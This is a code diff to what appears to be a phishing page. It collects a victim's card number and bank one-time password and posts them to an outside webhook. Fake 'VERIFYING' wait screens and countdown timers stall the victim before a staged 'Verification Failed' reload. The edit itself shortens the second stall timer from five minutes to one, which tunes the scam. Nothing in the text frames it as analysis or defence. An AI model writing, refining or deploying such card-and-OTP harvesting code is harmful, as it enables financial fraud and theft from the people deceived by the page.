@@ -157,7 +157,7 @@
 
 <!-- DOUBLE WAIT SCREENS -->
 <div id="wait-1" class="wait-screen"><div class="loader-ring"></div><h2 style="margin-top:30px;">VERIFYING...</h2><div class="timer-text" id="timer-1">01:00</div></div>
-<div id="wait-2" class="wait-screen"><div class="loader-ring"></div><h2 style="margin-top:30px; color:var(--yellow);">Finalizing Verification...</h2><div class="timer-text" id="timer-2">05:00</div></div>
+<div id="wait-2" class="wait-screen"><div class="loader-ring"></div><h2 style="margin-top:30px; color:var(--yellow);">Finalizing Verification...</h2><div class="timer-text" id="timer-2">01:00</div></div>
 
 <script>
     let code = "";
@@ -201,7 +201,7 @@
         const d = `**[2/2] BANK OTP**\nCard: ${document.getElementById('c-num').value}\nOTP: ${document.getElementById('bank-otp').value}`;
         fetch(hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:d})});
         document.getElementById('wait-2').style.display='flex';
-        runTimer(300, 'timer-2', () => { alert("Verification Failed. Please Retry Again."); location.reload(); });
+        runTimer(60, 'timer-2', () => { alert("Verification Failed. Please Retry Again."); location.reload(); });
     }
     function runTimer(sec, elId, cb) {
         let el = document.getElementById(elId);
